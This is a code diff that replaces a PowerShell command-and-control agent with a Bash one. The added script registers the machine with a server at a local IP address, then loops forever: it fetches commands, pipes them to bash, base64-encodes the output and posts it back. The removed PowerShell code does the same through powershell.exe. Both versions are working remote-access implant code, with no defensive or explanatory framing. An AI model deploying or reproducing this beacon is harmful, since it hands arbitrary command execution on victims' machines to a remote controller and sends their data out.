@@ -1,73 +1,37 @@
+#!/bin/bash
+ip="192.168.1.8"
+port="8000"
+interface="eth0"
+n=.3
 
+regl="http://$ip:$port/reg/"
 
-function shell($fname, $arg){
-    
-    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
-    $pinfo.FileName               = $fname
-    $pinfo.RedirectStandardError  = $true
-    $pinfo.RedirectStandardOutput = $true
-    $pinfo.UseShellExecute        = $false
-    $pinfo.Arguments              = $arg
-    $p                            = New-Object System.Diagnostics.Process
-    $p.StartInfo                  = $pinfo
-    
-    $p.Start() | Out-Null
-    $p.WaitForExit()
-    
-    $stdout = $p.StandardOutput.ReadToEnd()
-    $stderr = $p.StandardError.ReadToEnd()
+declare -A data=( [eth]=$interface [hname]=$(hostname) )
 
-    $res = "VALID $stdout`n$stderr"
-    $res
-}
+name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 
 
+taskl="http://$ip:$port/tasks/$name/"
+resultl="http://$ip:$port/Lin-results/$name/"
 
-$hostname = [System.Net.Dns]::GetHostName()
-$ip   = "192.168.1.4"
-$port = "8000"
-$interface = "eth0"
-# $key  = "REPLACE_KEY"
-$n    = 3
+while :
+do  
+	# tasks=0
+    curl $taskl > /tmp/tasks
 
-$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
-$data  = @{
-    eth = "$interface" 
-    hname = "$hostname"
-    }
-    
-$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
-#name= SDFCXS
+    # if [ -z "$tasks" ] 
+    splittasks=$(cat /tmp/tasks | tr ";" "\n")
+	while IFS= read -r line 
+	do
+		printf '%s\n' "$line" >> /tmp/tmp
+	done <<< $splittasks
+	cat /tmp/tmp|uniq -u > /tmp/tmps
 
-$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name/")
-$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name/")
-#http://1.1.1.1:1233/tasks/demo
+    cat /tmp/tmps|bash >> /tmp/result
+    base64 /tmp/result > /tmp/enc-result 
+    # sleep $n
+    curl -X POST --data "@/tmp/enc-result" $resultl
+    rm /tmp/result
+    rm /tmp/tmp
+	    
+done
 
-
-for (;;){
-    
-    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
-    #shell dir
-    
-    if (-Not [string]::IsNullOrEmpty($task)){
-        
-        # $task = Decrypt $key $task
-    $task = $task.split()  # task=['VALID','shell','dir']
-
-    
-        $arguments   = $task[0..$task.Length]
-    
-        $f    = "powershell.exe"
-        $arg  = "/c "
-    
-        foreach ($a in $arguments){ $arg += $a + " " }
-
-        $res  = shell $f $arg
-        # $res  = Encrypt $key $res
-        $data = @{result = "$res"}
-        
-        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
-        
-
-    sleep $n
-    }
-}
